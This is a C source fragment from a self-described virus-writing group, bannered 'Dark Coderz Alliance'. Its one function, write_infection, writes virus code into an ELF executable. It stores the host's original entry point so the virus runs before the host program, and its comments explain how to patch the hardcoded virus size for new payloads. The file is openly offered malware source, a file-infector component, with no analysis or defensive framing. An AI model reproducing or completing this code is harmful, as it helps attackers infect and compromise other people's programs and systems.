/*
     .........................................................
     :         ____ ___.__. ____   ____  _______  ___        :
     :       _/ ___<   |  |/    \_/ __ \/  _ \  \/  /        :
     :       \  \___\___  |   |  \  ___(  <_> >    <         :
     :        \___  > ____|___|  /\___  >____/__/\_ \        :
     :            \/\/         \/     \/           \/        :
     :                   __www.cyneox.tk_                    :
     :                                                       :
     :                                                       :
     :                        member of                      :
     :                                                       :
     :             _______  _________     _____              :
     :            \______ \ \_   ___ \   /  _  \             :
     :             |    |  \/    \  \/  /  /_\  \            :
     :             |    `   \     \____/    |    \           :
     :            /_______  /\______  /\____|__  /           :
     :                    \/        \/         \/            :
     :                ( Dark Coderz Alliance )               :
     :                   __www.dca-vx.tk__                   :
     :.......................................................:

*/

/* 
     Description : ....
*/

#include "defines.h"


int write_infection(Infect *file)
{
	enum { ADDR_SZ = sizeof(((Infect*)0)->origin_entry) };	
	enum { REST_OFS = ELF_ENTRY_OFF + ADDR_SZ };

	/* writting the the first byte of infection[] which is "push" 
	   we'll need that because after our virus gets executed then we must
	   know the host file address where we'll have to jump to execute 
	   the host code 
	*/

	write(file->fd_dest,&virus_code,ELF_ENTRY_OFF);
	
	/* writting the e_entry of the host file : "push [origin e_entry]" */
	
	write(file->fd_dest,&file->origin_entry,sizeof(file->origin_entry));
	
	/* write(file->fd_dest,virus_code + REST_OFS,sizeof(virus_code); didnt worked ;( */
	
	/* here is THE VIRUS SIZE...YOU'LL HAVE TO PATCH IT IF YOU'RE GOING TO USE A NEW 
	 * VIRUS CODE ;)
	 */
	
	write(file->fd_dest,virus_code + REST_OFS,65);   /* sizeof our virus code */
	                                                /* lame implementation, i know... */
	
	
	return true;
}
